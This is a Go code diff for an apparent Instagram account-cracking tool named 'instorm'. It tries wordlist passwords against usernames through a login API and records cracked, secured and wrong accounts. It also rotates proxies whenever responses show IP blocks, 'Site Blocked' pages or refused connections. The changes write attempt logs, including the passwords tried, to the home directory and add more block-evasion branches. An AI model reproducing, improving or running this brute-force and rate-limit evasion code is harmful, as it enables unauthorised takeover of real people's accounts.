@@ -20,11 +20,14 @@ import (
 )
 
 var users []string = []string{}
-var passwords []string = []string{}
+
+//var passwords []string = []string{}
 var cracked []string = []string{}
-var wrong []string = []string{}
+
+var wrong string = ""
 var secure []string = []string{}
-var instorm_log []string = []string{}
+
+var instorm_log string = ""
 var cookies []string = []string{}
 var passPath string
 var userPath string
@@ -155,6 +158,14 @@ func main() {
 	// Do it without threads!
 	user, _ := user.Current()
 	homeDict = user.HomeDir
+
+	instorm_log = homeDict + "/" + "instorm_log"
+	wrong = homeDict + "/" + "instorm_wrongs_log"
+	deleteFile(instorm_log)
+	deleteFile(wrong)
+	WriteToFile(instorm_log, "################Run: "+time.Now().Format("2006-01-02 15:04:05 PM Monday")+"################"+"\n")
+	WriteToFile(wrong, "################Run: "+time.Now().Format("2006-01-02 15:04:05 PM Monday")+"################"+"\n")
+
 	Start()
 
 }
@@ -177,7 +188,7 @@ func progress() {
 		output := [10]string{}
 		output[0] = fmt.Sprintf("\u001b[38;5;50m%s\u001b[0m \u001b[38;5;242m%s\u001b[0m", "Progress", "[")
 		output[1] = fmt.Sprintf("   \u001b[38;5;208m%s\u001b[0m: \u001b[38;5;35m%v\u001b[0m,", "Attempts", att)
-		output[2] = fmt.Sprintf("   \u001b[38;5;208m%s\u001b[0m: \u001b[38;5;35m%v\u001b[0m,", "Wrong attempts", len(wrong))
+		output[2] = fmt.Sprintf("   \u001b[38;5;208m%s\u001b[0m: \u001b[38;5;35m%v\u001b[0m,", "Wrong attempts", getFileLinesCount(wrong)-1)
 		output[3] = fmt.Sprintf("   \u001b[38;5;208m%s\u001b[0m: \u001b[38;5;35m%v\u001b[0m,", "Secured accounts", len(secure))
 		output[4] = fmt.Sprintf("   \u001b[38;5;208m%s\u001b[0m: \u001b[38;5;35m%v\u001b[0m,", "Cracked account", len(cracked))
 		output[5] = fmt.Sprintf("   \u001b[38;5;208m%s\u001b[0m: \u001b[38;5;35m%v\u001b[0m,", "Fails attempts", Fails)
@@ -544,44 +555,64 @@ func Check(us string) {
 				}
 			}
 			//
+			t1 := time.Now().Format("2006-01-02 15:04:05.000000000 PM Monday")
 			res := login(us, scanner.Text(), Proxy, true, InstaAPI, 15000)
+			t2 := time.Now().Format("2006-01-02 15:04:05.000000000 PM Monday")
 			att++
 			TotalUploadBandWidthInBytes += res.RequestSizeByBytes
 			TotalDownloadBandWidthInBytes += res.ResponseSizeByBytes
 
-			currentTime := time.Now().Format("2006-01-02 15:04:05 PM Monday")
+			res_str := res.Body
+
+			if strings.Contains(res_str, "<html>") || strings.Contains(res_str, "<head>") || strings.Contains(res_str, "<title>") ||
+				strings.Contains(res_str, "<!DOCTYPE") {
+				for {
+					rnd := RandRange(0, 99999999999)
+					fileName := homeDict + "/" + "instorm_LongResponse" + fmt.Sprintf("%v", rnd)
+					Existence := CheckFileExistence(fileName)
+					if Existence {
+						continue
+					}
+					WriteToFile(fileName, res_str)
+					res_str = fileName
+					break
+				}
+			}
 
 			if Proxy != "" {
-				instorm_log = append(instorm_log,
+				appendToFile(instorm_log,
 					"Attempt #"+fmt.Sprintf("%v", att)+"\n"+
 						"------------------------------------------------"+"\n"+
-						"Time & Date: "+currentTime+"\n"+
-						"Wrongs: "+fmt.Sprintf("%v", len(wrong))+"\n"+
+						"Time & Date: "+time.Now().Format("2006-01-02 15:04:05 PM Monday")+"\n"+
+						"Wrongs: "+fmt.Sprintf("%v", getFileLinesCount(wrong))+"\n"+
 						"Cracked: "+fmt.Sprintf("%v", len(cracked))+"\n"+
 						"Secured: "+fmt.Sprintf("%v", len(secure))+"\n"+
 						"fails: "+fmt.Sprintf("%v", Fails)+"\n"+
 						"username: "+us+"\n"+
 						"password: "+scanner.Text()+"\n"+
-						"Response: "+res.Body+"\n"+
+						"Request sent at: "+t1+"\n"+
+						"Response arrived at: "+t2+"\n"+
+						"Response: "+res_str+"\n"+
 						"error: "+res.Err+"\n"+
 						"Proxy: "+Proxy+"\n"+
 						"------------------------------------------------"+"\n")
 			} else {
-				instorm_log = append(instorm_log,
+				appendToFile(instorm_log,
 					"Attempt #"+fmt.Sprintf("%v", att)+"\n"+
 						"------------------------------------------------"+"\n"+
-						"Time & Date: "+currentTime+"\n"+
-						"Wrongs: "+fmt.Sprintf("%v", len(wrong))+"\n"+
+						"Time & Date: "+time.Now().Format("2006-01-02 15:04:05 PM Monday")+"\n"+
+						"Wrongs: "+fmt.Sprintf("%v", getFileLinesCount(wrong))+"\n"+
 						"Cracked: "+fmt.Sprintf("%v", len(cracked))+"\n"+
 						"Secured: "+fmt.Sprintf("%v", len(secure))+"\n"+
 						"fails: "+fmt.Sprintf("%v", Fails)+"\n"+
 						"username: "+us+"\n"+
 						"password: "+scanner.Text()+"\n"+
-						"Response: "+res.Body+"\n"+
+						"Request sent at: "+t1+"\n"+
+						"Response arrived at: "+t2+"\n"+
+						"Response: "+res_str+"\n"+
 						"error: "+res.Err+"\n"+
 						"------------------------------------------------"+"\n")
 			}
-			_ = writeLines(instorm_log, homeDict+"/"+"instorm_log")
 			if !strings.Contains(res.Body, "sentry_block") && !strings.Contains(res.Body, "ip_block") && !strings.Contains(res.Body, "Please wait") {
 				Blocked = false
 			}
@@ -616,6 +647,16 @@ func Check(us string) {
 					//change password
 				}
 
+			} else if strings.Contains(res.Body, "<title>Site Blocked</title>") {
+				Blocked = true
+				if ProxyCounter == len(Proxies)-1 {
+					HTTPS, HTTP, Proxies = GetProxies()
+					ProxyCounter = 0
+				}
+				Proxy = Proxies[ProxyCounter]
+				ProxyCounter++
+				belong = 0
+				continue
 			} else if strings.Contains(res.Body, "secure") || strings.Contains(res.Body, "unusable_password") ||
 				strings.Contains(res.Body, "checkpoint_challenge_required") || strings.Contains(res.Body, "challenge_required") {
 				if !ssliceContains(secure, us) && us != "" {
@@ -625,9 +666,11 @@ func Check(us string) {
 					_ = writeLines(secure, securePath)
 				}
 			} else if strings.Contains(res.Body, "bad_password") || strings.Contains(res.Body, "invalid_user") {
-				if !ssliceContains(wrong, us) && us != "" {
-					wrong = append(wrong, us+":"+scanner.Text())
+
+				if !fileContains(wrong, us+":"+scanner.Text()+"\n") && us != "" {
+					appendToFile(wrong, us+":"+scanner.Text()+"\n")
 				}
+
 			} else if strings.Contains(res.Body, "Oops, an error occurred.") {
 				if LoopFails {
 					time.Sleep(time.Millisecond * 10000)
@@ -640,11 +683,11 @@ func Check(us string) {
 				if LoopFails {
 					time.Sleep(time.Millisecond * 10000)
 					belong++
-					if res.Body == "" && !(belong > 3) {
+					if res.Body == "" && (belong < 2) {
 						time.Sleep(time.Millisecond * 5000) //temporary
 						continue
 					}
-					if belong > 3 {
+					if belong > 2 {
 						Blocked = true
 						if ProxyCounter == len(Proxies)-1 {
 							HTTPS, HTTP, Proxies = GetProxies()
@@ -683,12 +726,32 @@ func Check(us string) {
 				continue
 			} else {
 				if LoopFails {
+
+					if strings.Contains(res.Err, "Timeout exceeded while") {
+						continue
+					}
+
+					if strings.Contains(res.Err, "connection refused") || strings.Contains(res.Err, "connection reset by peer") {
+						Blocked = true
+						if ProxyCounter == len(Proxies)-1 {
+							HTTPS, HTTP, Proxies = GetProxies()
+							ProxyCounter = 0
+						}
+						Proxy = Proxies[ProxyCounter]
+						ProxyCounter++
+						continue
+					}
 					time.Sleep(time.Millisecond * 10000)
 					belong++
 					if res.Body == "" && res.Err != "null" {
 						time.Sleep(time.Millisecond * 5000) //temporary
 						continue
 					}
+
+					// Timeout exceeded while
+					// connection reset by peer
+					// connection refused
+
 					if belong > 3 {
 						Blocked = true
 						if ProxyCounter == len(Proxies)-1 {
@@ -702,6 +765,16 @@ func Check(us string) {
 					continue
 				} else {
 					Fails++
+					if strings.Contains(res.Err, "connection refused") {
+						Blocked = true
+						if ProxyCounter == len(Proxies)-1 {
+							HTTPS, HTTP, Proxies = GetProxies()
+							ProxyCounter = 0
+						}
+						Proxy = Proxies[ProxyCounter]
+						ProxyCounter++
+						continue
+					}
 					continue
 				}
 			}
@@ -838,6 +911,16 @@ func CheckPathToFolder(path string) bool {
 		}
 	}
 	return false
+}
+
+func CheckFileExistence(path string) bool {
+
+	_, err := os.Open(path)
+	if err != nil {
+		return false
+	}
+	return true
+
 }
 
 func CheckPathToFile(path string) bool {
